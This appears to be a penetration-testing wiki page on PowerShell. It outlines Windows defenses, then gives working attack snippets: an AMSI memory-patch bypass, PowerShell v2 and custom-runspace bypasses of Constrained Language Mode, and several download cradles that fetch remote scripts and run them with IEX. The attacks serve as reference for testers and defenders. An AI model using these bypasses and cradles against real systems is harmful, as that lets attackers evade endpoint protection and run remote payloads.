# PowerShell

### PowerShell Defenses

PowerShell incorportes multiple defense mechanism such as:

* **PowerShell Transcripts** - These can be system-wide and should be configured to be system-wide to cover more area of detection
* **PowerShell AMSI (Antimalware Scan Interface)** - This is typically a component of the security solution installed on a machine which can either be an EDR or AntiVirus solution. \
  \
  Typically EDR providers create and use their own version of AMSI which is more advanced in the detection of malicious scripts or commands being imported or executed&#x20;
* **Script Blocking** - Block PowerShell scripts from being imported and executed
* **AppLocker** - A configuration-based protection in Windows platform which can block execution of untrusted binaries or PowerShell scripts. [https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview#applocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/appcontrol-and-applocker-overview#applocker)\
  \
  Replaced by WDAC due to much better coverage and difficulty around bypassing
* **PowerShell CLM (Constrained Language Mode)** -  This mode restricts usage of certain PowerShell features which would prevent a user from loading or using Windows APIs. A simple example can be found here as well as some more information: [https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/)\
  \
  Note that this feature of PowerShell shouldn't be considered as secure and instead, should be relied on other features mentioned here ! &#x20;
* **WDAC (Windows  Defender Application Control)** - A policy can be defined in WDAC to block or only allow specific binaries, scripts and so on. This provides strict management of code execution on machines. It can also allow execution of binaries which are internally signed either by a custom CA or by ADCS code signing certificate templates. \
  \
  A nice YouTube explaining the basics is located here - [https://www.youtube.com/watch?v=Nj5vBloAWy0](https://www.youtube.com/watch?v=Nj5vBloAWy0)

### PowerShell Attacks and Bypasses

#### PowerShell AMSI Bypass

Multiple ways of bypassing AMSI exist which are public such as byte patching which would force AMSI to always return a status of `AMSI_STATUS_CLEAN`.&#x20;

Public resources such as the below exist to provide testers with ways of bypassing AMSI so a malicious script can be loaded:

* [https://amsi.fail/](https://amsi.fail/)
* [https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)

Another example below which will patch AMSI to return a `null` value:

```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

> **Too many AMSI bypasses can force Defender to flag every binary or script as malicious regardless if its true or not! Bypasses should be applied when a script, binary or command is of suspicious nature to Defender and AMSI.**

#### PowerShell CLM Bypass

Constrained Language Mode can be bypassed using various methods. One very well known method is use check for PowerShell version 2 which does not incorporate security boundaries and therefore is not affected by AMSI or CLM and other such features.

```powershell
PS C:\Users\user> powershell -ver 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> "AmsiUtils"
AmsiUtils
```

> When AppLocker is enforcing whitelisting rules against PowerShell scripts, ConstrainedLanguageMode is enabled as well.

The current PowerShell language mode can also be viewed using the following command:

```powershell
PS C:\Users\user> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

A custom runspace can also be used to create a PowerShell session such as using the example code:

```csharp
using System;
using System.Management.Automation.Runspaces;
using System.Management.Automation;

namespace PSLangBypass
{
    class LangBypass
    {
        static void Main(string[] args)
        {
            // Creating the runspace and opening it
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            
            // Getting the LanguageMode of current session and saving to a file
	    // This should be possible to replace with a powershell b64 encoded grunt if using Covenant i.e
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            
            // Creating powershell object
            PowerShell ps = PowerShell.Create();

            // Initialising the runspace
            ps.Runspace = rs;

            // Running the command above
            ps.AddScript(cmd);
            ps.Invoke();

            // Closing file 
            rs.Close();
        }
    }
}
```

#### PowerShell Script Execution

* Importing a script (`.ps1`)

```powershell
$ . C:\Windows\Tasks\script.ps1
```

* Importing a module (`.psd1`)

```powershell
$ import-module C:\Windows\Tasks\script.psd1
```

```powershell
$ ipmo C:\Windows\Tasks\script.psd1
```

Where `ipmo` is an alias to `Import-Module`.

To obtain a list of the aliases in PowerShell on a machine, the command `Get-Alias` can be executed. On Windows 11 24H2, the default aliases for commands are as follows:

```powershell
PS C:\Users\user> Get-Alias

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           % -> ForEach-Object
Alias           ? -> Where-Object
Alias           ac -> Add-Content
Alias           asnp -> Add-PSSnapin
Alias           cat -> Get-Content
Alias           cd -> Set-Location
Alias           CFS -> ConvertFrom-String                          3.1.0.0    Microsoft.PowerShell.Utility
Alias           chdir -> Set-Location
Alias           clc -> Clear-Content
Alias           clear -> Clear-Host
Alias           clhy -> Clear-History
Alias           cli -> Clear-Item
Alias           clp -> Clear-ItemProperty
Alias           cls -> Clear-Host
Alias           clv -> Clear-Variable
Alias           cnsn -> Connect-PSSession
Alias           compare -> Compare-Object
Alias           copy -> Copy-Item
Alias           cp -> Copy-Item
Alias           cpi -> Copy-Item
Alias           cpp -> Copy-ItemProperty
Alias           curl -> Invoke-WebRequest
Alias           cvpa -> Convert-Path
Alias           dbp -> Disable-PSBreakpoint
Alias           del -> Remove-Item
Alias           diff -> Compare-Object
Alias           dir -> Get-ChildItem
Alias           dnsn -> Disconnect-PSSession
Alias           ebp -> Enable-PSBreakpoint
Alias           echo -> Write-Output
Alias           epal -> Export-Alias
Alias           epcsv -> Export-Csv
Alias           epsn -> Export-PSSession
Alias           erase -> Remove-Item
Alias           etsn -> Enter-PSSession
Alias           exsn -> Exit-PSSession
Alias           fc -> Format-Custom
Alias           fhx -> Format-Hex                                  3.1.0.0    Microsoft.PowerShell.Utility
Alias           fl -> Format-List
Alias           foreach -> ForEach-Object
Alias           ft -> Format-Table
Alias           fw -> Format-Wide
Alias           gal -> Get-Alias
Alias           gbp -> Get-PSBreakpoint
Alias           gc -> Get-Content
Alias           gcb -> Get-Clipboard                               3.1.0.0    Microsoft.PowerShell.Management
Alias           gci -> Get-ChildItem
Alias           gcm -> Get-Command
Alias           gcs -> Get-PSCallStack
Alias           gdr -> Get-PSDrive
Alias           ghy -> Get-History
Alias           gi -> Get-Item
Alias           gin -> Get-ComputerInfo                            3.1.0.0    Microsoft.PowerShell.Management
Alias           gjb -> Get-Job
Alias           gl -> Get-Location
Alias           gm -> Get-Member
Alias           gmo -> Get-Module
Alias           gp -> Get-ItemProperty
Alias           gps -> Get-Process
Alias           gpv -> Get-ItemPropertyValue
Alias           group -> Group-Object
Alias           gsn -> Get-PSSession
Alias           gsnp -> Get-PSSnapin
Alias           gsv -> Get-Service
Alias           gtz -> Get-TimeZone                                3.1.0.0    Microsoft.PowerShell.Management
Alias           gu -> Get-Unique
Alias           gv -> Get-Variable
Alias           gwmi -> Get-WmiObject
Alias           h -> Get-History
Alias           history -> Get-History
Alias           icm -> Invoke-Command
Alias           iex -> Invoke-Expression
Alias           ihy -> Invoke-History
Alias           ii -> Invoke-Item
Alias           ipal -> Import-Alias
Alias           ipcsv -> Import-Csv
Alias           ipmo -> Import-Module
Alias           ipsn -> Import-PSSession
Alias           irm -> Invoke-RestMethod
Alias           ise -> powershell_ise.exe
Alias           iwmi -> Invoke-WmiMethod
Alias           iwr -> Invoke-WebRequest
Alias           kill -> Stop-Process
Alias           lp -> Out-Printer
Alias           ls -> Get-ChildItem
Alias           man -> help
Alias           md -> mkdir
Alias           measure -> Measure-Object
Alias           mi -> Move-Item
Alias           mount -> New-PSDrive
Alias           move -> Move-Item
Alias           mp -> Move-ItemProperty
Alias           mv -> Move-Item
Alias           nal -> New-Alias
Alias           ndr -> New-PSDrive
Alias           ni -> New-Item
Alias           nmo -> New-Module
Alias           npssc -> New-PSSessionConfigurationFile
Alias           nsn -> New-PSSession
Alias           nv -> New-Variable
Alias           ogv -> Out-GridView
Alias           oh -> Out-Host
Alias           popd -> Pop-Location
Alias           ps -> Get-Process
Alias           pushd -> Push-Location
Alias           pwd -> Get-Location
Alias           r -> Invoke-History
Alias           rbp -> Remove-PSBreakpoint
Alias           rcjb -> Receive-Job
Alias           rcsn -> Receive-PSSession
Alias           rd -> Remove-Item
Alias           rdr -> Remove-PSDrive
Alias           ren -> Rename-Item
Alias           ri -> Remove-Item
Alias           rjb -> Remove-Job
Alias           rm -> Remove-Item
Alias           rmdir -> Remove-Item
Alias           rmo -> Remove-Module
Alias           rni -> Rename-Item
Alias           rnp -> Rename-ItemProperty
Alias           rp -> Remove-ItemProperty
Alias           rsn -> Remove-PSSession
Alias           rsnp -> Remove-PSSnapin
Alias           rujb -> Resume-Job
Alias           rv -> Remove-Variable
Alias           rvpa -> Resolve-Path
Alias           rwmi -> Remove-WmiObject
Alias           sajb -> Start-Job
Alias           sal -> Set-Alias
Alias           saps -> Start-Process
Alias           sasv -> Start-Service
Alias           sbp -> Set-PSBreakpoint
Alias           sc -> Set-Content
Alias           scb -> Set-Clipboard                               3.1.0.0    Microsoft.PowerShell.Management
Alias           select -> Select-Object
Alias           set -> Set-Variable
Alias           shcm -> Show-Command
Alias           si -> Set-Item
Alias           sl -> Set-Location
Alias           sleep -> Start-Sleep
Alias           sls -> Select-String
Alias           sort -> Sort-Object
Alias           sp -> Set-ItemProperty
Alias           spjb -> Stop-Job
Alias           spps -> Stop-Process
Alias           spsv -> Stop-Service
Alias           start -> Start-Process
Alias           stz -> Set-TimeZone                                3.1.0.0    Microsoft.PowerShell.Management
Alias           sujb -> Suspend-Job
Alias           sv -> Set-Variable
Alias           swmi -> Set-WmiInstance
Alias           tee -> Tee-Object
Alias           trcm -> Trace-Command
Alias           type -> Get-Content
Alias           wget -> Invoke-WebRequest
Alias           where -> Where-Object
Alias           wjb -> Wait-Job
Alias           write -> Write-Output
```

* Listing all commands of an imported module:

```powershell
$ Get-Command -Module ModuleOne
```

* Using a download cradle to obtain a script from a remote source and execute it:

```powershell
IEX(New-Object Net.WebClient).DownloadString('https://example.com/nonmalicious.jpeg')
```

<pre class="language-powershell"><code class="lang-powershell">$WebC = New-Object Net.WebClient;
<strong>$str = $WebC.DownloadString('https://example.com/nonmalicious.jpeg');
</strong><strong>IEX($str)
</strong></code></pre>

* Using a COM Object to Internet Explorer

```powershell
$ie = New-Object -ComObject InternetExplorer.Application;
$ie.visible = $false;
$ie.navigation = ('https://example.com/nonmalicious.jpeg');
sleep 5;
$response = $ie.Document.Body.innerHTML;
$ie.quit();
iex($response)
```

* For PowerShell version 3 onwards the `Invoke-WebRequest`  (with alias of `iwr`) command can be used instead.

```powershell
IEX(IWR -useb 'https:/example.com/nonmalicious.jpeg/')
```

An error can occur when using `Invoke-WebRequest` without the argument `-UseBasicParsing`. This is due to the IE Engine not being enable as Microsoft have deprecated Internet Explorer.

<figure><img src="../.gitbook/assets/The response content cannot be parsed.webp" alt=""><figcaption></figcaption></figure>

So for this reason the `-UseBasicParsing` argument can be added to the command to resolve the issue.

* Using a COM Object to MSXML2:

```powershell
$h = New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET', 'https://example.com/nonmalicious.jpeg', $false);
$h.send();
iex($h.response)
```

* Using the `WebRequest` class in .NET:

```powershell
$wr = [System.NET.WebRequest]::Create("https://example.com/hello.webp")
$r = $wr.GetResponse();
IEX([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

